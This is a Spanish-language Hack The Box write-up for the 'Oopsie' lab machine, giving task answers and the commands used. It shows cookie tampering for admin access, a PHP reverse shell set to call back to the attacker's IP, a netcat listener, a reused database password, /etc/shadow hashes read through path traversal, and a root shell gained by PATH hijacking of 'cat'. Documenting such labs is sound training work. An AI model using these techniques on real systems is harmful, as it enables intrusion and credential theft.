---
title: Oopsie
date: 2025-07-28 00:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, oopsie, web explotation, bugtracker]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/c5843e27067b877dfba7a82e4209a279.png
    alt: Hack The Box
---

## Oopsie 

## Task 1

With what kind of tool can intercept web traffic? 
>proxy

## Task 2

What is the path to the directory on the webserver that returns a login page? 

Como uso Kali en una VM para los retos de HTB podemos usar BurpSuite para usar el spider, en la pestaña 
"Site map", se descubre esta URL.

``` http://10.129.201.26/cdn-cgi/login/script.js ```

>/cdn-cgi/login

## Task 3

What can be modified in Firefox to get access to the upload page? 

Visito la web de login y al pie del formulario tenemos un enlace para invitados http://10.129.201.26/cdn-cgi/login/?guest=true , al interceptar con Burp , podemos ver que lo que preguntan es por la manipulación de la cookie imagino para manipular los permisos de subida. 

``` Cookie: user=2233; role=guest ```

Lo envío al "Repeater". Si seguimos explorando la web encontraremos varias pestañas y si ponemos atención a la URL vemos que acaba en un id, empezamos con id=2 pero si cambiamos a 1 veremos otros registros 

``` 34322	admin	admin@megacorp.com ```

Manipulo el request para engañar a la página, en Firefox vamos a las dev tools y manipulamos el storage para modificar los valores de la cookie.

``` Cookie: user=34322; role=superadmin ```

Ahora si nos permite subir una imagen pues mostrará un formulario 

``` html
Repair Management System

Branding Image Uploads

Brand Name	

```

>cookie

## Task 4

What is the access ID of the admin user? 
>34322

## Task 5

On uploading a file, what directory does that file appear in on the server? 

>/uploads

Subir una PHP shell como hicimos en otros retos, no parece funcionar. Así que descargamos una reverse shell de PHP. [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

La idea es subirla al servidor y al visitar la página esta creará una conexión a nuestra máquina. PHP se ejecuta del lado del servidor así que si consigues subir un archivo .php a alguna ruta donde el servidor web tenga acceso, es posible introducir una shell, en este caso una shell que inicia la conexión hacia la máquina atacante. Configuro ```php-reverse-shell.php``` para que apunte a la ip de mi máquina y un puerto de escucha. 

``` php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.233';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

Ponemos la máquina Kali en escucha en el puerto elegido (4444 en este caso).

``` shell
┌──(kali㉿kali25)-[~]
└─$ nc -lvnp 4444             
```

Subo ```php-reverse-shell.php``` través de la web y visito en el navegador la URL donde se supone que se ha subido. ```/uploads/php-reverse-shell.php ```

```The file php-reverse-shell.php has been uploaded.```

``` http://10.129.201.26/uploads/php-reverse-shell.php ```

Ahora si miramos en la consola se deberá establecer la conexión

``` shell
┌──(kali㉿kali25)-[~]
└─$ nc -lvnp 4444             
listening on [any] 4444 ...
connect to [10.10.14.233] from (UNKNOWN) [10.129.201.26] 48252
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 22:20:57 up  3:22,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Un truquito para tener una shell más decente es usar el intérprete de python que está instalado en la máquina junto con el módulo pty. 

``` python3 -c 'import pty; pty.spawn("/bin/bash")' ```


## Task 6

What is the file that contains the password that is shared with the robert user? 

Si buscas encuentras cosas interesantes

```
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```
>db.php

Pues al lío conectemos con la DB

``` shell
www-data@oopsie:/var/www/html/cdn-cgi/login$ mysql -urobert -pM3g4C0rpUs3r!
mysql -urobert -pM3g4C0rpUs3r!
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 12
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```
En principio consultaremos la base de datos indicada en la cadena de conexión de ```db.php```

``` shell
mysql> use garage;
use garage;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+------------------+
| Tables_in_garage |
+------------------+
| accounts         |
| branding         |
| clients          |
+------------------+
3 rows in set (0.01 sec)
```

Consultamos la tabla accounts por supuesto.

``` shell
mysql> select * from accounts;
select * from accounts;
+------+--------+-------------+-------------------------+
| id   | access | name        | email                   |
+------+--------+-------------+-------------------------+
|   13 |  57633 | Peter       | peter@qpic.co.uk        |
|   23 |  28832 | Rafol       | tom@rafol.co.uk         |
|    4 |   8832 | john        | john@tafcz.co.uk        |
|   30 |  86575 | super admin | superadmin@megacorp.com |
|    1 |  34322 | admin       | admin@megacorp.com      |
|    2 |   2233 | guest       | guest@megacorp.com      |
+------+--------+-------------+-------------------------+
6 rows in set (0.01 sec)
```

Interesante, el superadmin es id 30 y access 86575, el resto de tablas parece información de precios y clientes.

## Task 7

What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group? 
Para cumplir con la pista que nos dan ejecutaremos el comando

 ``` shell
 find / -group bugtracker
 /usr/bin/bugtracker
```
>find

## Task 8

Regardless of which user starts running the bugtracker executable, what's user privileges will use to run? 
``` shell
www-data@oopsie:/usr/bin$ ls -ltr bugtracker
ls -ltr bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 bugtracker
```
>root


## Task 9

What SUID stands for? 

>set owner user ID

En este punto intento usar las credenciales de robert para saber sirven para la shell
``` shell
www-data@oopsie:/var/lib$ su - robert
su - robert
Password: M3g4C0rpUs3r!

robert@oopsie:~$ id
id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

Parece que robert pertenece a dos grupos y justo este usuario puede ejecutar el binario ```/usr/bin/bugtracker``` , quizás, podría ser una manera de escalar privilegios 

Primero pruebo a lanzar el binario para ver que ocurre

``` shell
robert@oopsie:~$  /usr/bin/bugtracker
 /usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
1
---------------

Binary package hint: ev-engine-lib

Version: 3.3.3-1

Reproduce:
When loading library in firmware it seems to be crashed

What you expected to happen:
Synchronized browsing to be enabled since it is enabled for that site.

What happened instead:
Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
```

Pruebo con el comando strings pues es muy útil a la hora de extraer texto de binarios.

``` shell
robert@oopsie:~$ strings /usr/bin/bugtracker
strings /usr/bin/bugtracker
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
strcpy
__isoc99_scanf
__stack_chk_fail
putchar
printf
strlen
malloc
strcat
system
geteuid
__cxa_finalize
__libc_start_main
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
AWAVI
AUATL
[]A\A]A^A_
------------------
: EV Bug Tracker :
------------------
Provide Bug ID: 
---------------
cat /root/reports/
;*3$"
GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7697
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
test.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
putchar@@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
strcpy@@GLIBC_2.2.5
_edata
strlen@@GLIBC_2.2.5
__stack_chk_fail@@GLIBC_2.4
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
concat
geteuid@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
malloc@@GLIBC_2.2.5
__bss_start
main
__isoc99_scanf@@GLIBC_2.7
strcat@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```
Podría ser que nos esté dando una pista de como escalar privilegios llama la atención esta línea ```cat /root/reports/```, el binario llama al comando cat para leer un fichero que se encuentra en el directorio de root, por lo cual podemos deducir que el binario tiene acceso al directorio ```/root/reports```

## Task 10

What is the name of the executable being called in an insecure manner? 

Lo anterior se confirma si introducimos cat en la tarea 10,  ahora deberíamos buscar una manera de truncar ese premiso para ganar acceso al directorio root. 
> cat

## Submit Flag

Submit user flag 

Revisamos el home del usuario robert

```shell
robert@oopsie:~$ cat user.txt
cat user.txt
f2c74ee8db79838************
``` 
>f2c74ee8db79838************

Antes de obtener la flag nos pide capturar una bandera de usuario.


Sabemos que este programa bugtracker pide un parametro que introducimos, pero jugando con el descubriremos que si envíamos algo incorrecto, el debug del programa delata esta falla, ```cat: /root/reports/2.txt: No such file or directory``` envíamos un PATH podemos leer casi cualquier archivo del sistema

``` shell
robert@oopsie:~$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 2.txt
2.txt
---------------

cat: /root/reports/2.txt: No such file or directory
```

Así que si queremos subir hacia el raíz debemos subir al menos dos niveles ``` ../../ ``` pera alcanzar algunos ficheros interesantes

``` shell
robert@oopsie:~$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: ../../etc/shadow
../../etc/shadow
---------------

root:$6$eD0n5saZ$orykpdd7mVL/lF57rIGwUzeSROPC1KRITJ45Nqn6P2BLaZ.tcSOy5fNFcOw9uBRkClgu5R9WlyxpEId5qOOVY.:18285:0:99999:7:::
daemon:*:18113:0:99999:7:::
bin:*:18113:0:99999:7:::
sys:*:18113:0:99999:7:::
sync:*:18113:0:99999:7:::
games:*:18113:0:99999:7:::
man:*:18113:0:99999:7:::
lp:*:18113:0:99999:7:::
mail:*:18113:0:99999:7:::
news:*:18113:0:99999:7:::
uucp:*:18113:0:99999:7:::
proxy:*:18113:0:99999:7:::
www-data:*:18113:0:99999:7:::
backup:*:18113:0:99999:7:::
list:*:18113:0:99999:7:::
irc:*:18113:0:99999:7:::
gnats:*:18113:0:99999:7:::
nobody:*:18113:0:99999:7:::
systemd-network:*:18113:0:99999:7:::
systemd-resolve:*:18113:0:99999:7:::
syslog:*:18113:0:99999:7:::
messagebus:*:18113:0:99999:7:::
_apt:*:18113:0:99999:7:::
lxd:*:18113:0:99999:7:::
uuidd:*:18113:0:99999:7:::
dnsmasq:*:18113:0:99999:7:::
landscape:*:18113:0:99999:7:::
pollinate:*:18113:0:99999:7:::
sshd:*:18284:0:99999:7:::
robert:$6$kriHoPwv$iBt45Fu0g4R0uNWSubfjDRvtUSwxVu.U1JhYKmT4voMWlVc3/u2nu0j0JZL0YWmm62vRgAs4acBl8Ge.S393H/:18285:0:99999:7:::
mysql:!:18284:0:99999:7:::
```
Que pasa si fuerzo el cat de ```../*``` o dicho de otra manera ```/root/*```
``` shell
robert@oopsie:~$ bugtracker 
bugtracker 

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: ../*
../*
---------------

cat: /root/reports/../reports: Is a directory
af13b0bee69f8a877c3faf667f7beacf
```
## Submit root flag 
Sin entrar en complicaciones descubrimos la flag. 

>af13b0bee69f8a877c3faf667f7beacf

[achivement](https://labs.hackthebox.com/achievement/machine/2336390/288)

Otra forma que más tarde encontré de explotarlo está basada en que parece que cat se llama sin indicar su ruta absoluta, con lo cual podemos truncar dicha ruta para el usuario actual y obtener una shell cuando lancemos bugtracker

``` shell
export PATH=/tmp:$PATH
cd /tmp
echo '/bin/sh' > cat
chmod +x cat
```

``` shell
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
---------------

whoami
root
cd /root
ls
reports  root.txt
```